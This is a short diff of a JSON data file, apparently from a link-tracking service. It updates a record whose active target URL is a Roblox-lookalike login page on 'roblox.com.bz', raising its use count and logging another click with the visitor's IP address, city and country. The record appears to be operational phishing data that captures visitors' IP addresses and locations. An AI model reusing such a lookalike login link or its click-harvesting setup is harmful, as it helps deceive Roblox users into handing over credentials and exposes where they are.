@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 7,
+    "useCount": 8,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14214,6 +14214,14 @@
       },
       {
         "timestamp": 1778692058020,
+        "ip": "178.135.16.169",
+        "country": "Lebanon",
+        "city": "Beirut",
+        "flag": "🇱🇧",
+        "countryCode": "LB"
+      },
+      {
+        "timestamp": 1778692947278,
         "ip": "178.135.16.169",
         "country": "Lebanon",
         "city": "Beirut",
